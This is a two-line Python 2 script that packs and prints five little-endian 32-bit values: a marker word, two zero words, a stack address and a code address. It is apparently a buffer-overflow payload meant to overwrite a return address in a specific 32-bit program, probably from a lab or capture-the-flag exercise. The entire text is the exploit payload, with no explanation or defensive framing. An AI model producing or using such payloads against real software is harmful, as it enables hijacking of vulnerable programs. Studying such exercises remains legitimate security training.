from struct import pack
print pack("<IIIII",0xaabbccdd,0x00000000,0x00000000,0xbffe9a98,0x08048efe)
